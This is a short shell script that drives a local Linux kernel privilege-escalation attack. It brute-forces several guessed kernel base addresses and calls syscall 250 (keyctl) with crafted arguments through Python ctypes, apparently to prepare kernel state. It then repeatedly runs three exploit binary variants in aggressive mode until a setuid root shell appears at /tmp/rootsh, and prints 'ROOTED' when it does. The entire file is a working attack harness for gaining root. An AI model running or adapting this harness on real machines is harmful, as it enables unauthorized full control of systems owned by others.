#!/bin/sh
cd /tmp/rt || exit 1
for kb in 0xffffffffb9800000 0xffffffffb9600000 0xffffffffb9a00000; do
  echo "=== kbase=$kb ==="
  for i in 1 2 3 4 5 6 7 8 9 10; do
    python3 -c "import ctypes;l=ctypes.CDLL(None);[l.syscall(250,7,ctypes.c_ulong(r)) for r in range(-1,-10,-1)]" 2>/dev/null
    for exe in e_exploit e_exploit-fixdef e_exploit-wide2; do
      BBH_KBASE=$kb timeout 70 ./$exe --aggressive --quiet >/dev/null 2>&1
      if [ -u /tmp/rootsh ]; then echo "ROOTED kbase=$kb exe=$exe attempt=$i"; ls -la /tmp/rootsh; exit 0; fi
    done
  done
  echo "  no root at $kb"
done
echo "DONE"
